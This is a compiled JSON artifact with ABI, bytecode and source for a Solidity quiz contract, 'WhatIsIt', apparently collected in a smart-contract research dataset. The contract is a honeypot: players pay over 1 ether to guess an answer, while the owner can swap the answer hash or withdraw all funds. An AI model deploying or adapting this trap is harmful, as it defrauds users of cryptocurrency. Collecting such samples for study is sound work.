{
  "contractName": "WhatIsIt",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "guess",
          "type": "string"
        }
      ],
      "name": "Answer",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "StartQuiz",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopQuiz",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuiz",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106d9806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806304858fef1461006f57806326e336701461011157806363e3fbbd1461017b578063c8166a8a14610185578063e94e83d814610215575b005b61010f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610271565b005b610179600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061034d565b005b6101836103ca565b005b34801561019157600080fd5b5061019a610481565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101da5780820151818401526020810190506101bf565b50505050905090810190601f1680156102075780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61026f600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061051f565b005b600060010260005460001916141561034957806040518082805190602001908083835b6020831015156102b95780518252602082019150602081019050602083039250610294565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600081600019169055508160019080519060200190610306929190610608565b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103c65781600190805190602001906103b9929190610608565b5080600081600019169055505b5050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561047f573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561047d573d6000803e3d6000fd5b505b565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156105175780601f106104ec57610100808354040283529160200191610517565b820191906000526020600020905b8154815290600101906020018083116104fa57829003601f168201915b505050505081565b806040518082805190602001908083835b6020831015156105555780518252602082019150602081019050602083039250610530565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600054600019161480156105a15750670de0b6b3a764000034115b15610605573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610603573d6000803e3d6000fd5b505b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064957805160ff1916838001178555610677565b82800160010185558215610677579182015b8281111561067657825182559160200191906001019061065b565b5b5090506106849190610688565b5090565b6106aa91905b808211156106a657600081600090555060010161068e565b5090565b905600a165627a7a72305820e78e964f8c2a32a4394296fedbb6376b8d755415b097826e8003281a074480b30029",
  "source": "\n\ncontract WhatIsIt\n{\n    bytes32 responseHash;\n    string public Question;\n    address questionSender;\n\n    function Answer(string guess)\n    public payable {\n        if (responseHash == keccak256(guess) && msg.value>1 ether) {\n            msg.sender.transfer(this.balance);\n        }\n    }\n \n    function StartQuiz(string question, string response)\n    public payable {\n        if (responseHash==0x0) {\n            responseHash = keccak256(response);\n            Question = question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function StopQuiz()\n    public payable {\n        if (msg.sender==questionSender) {\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function NewQuiz(string question, bytes32 _responseHash)\n    public payable {\n        if (msg.sender==questionSender) {\n            Question = question;\n            responseHash = _responseHash;\n        }\n    }\n\n    function () public payable { }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xed55fb58ea9de1f484addcc970463218b4d89cfe/contracts/0xed55fb58ea9de1f484addcc970463218b4d89cfe.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:09:50.802Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}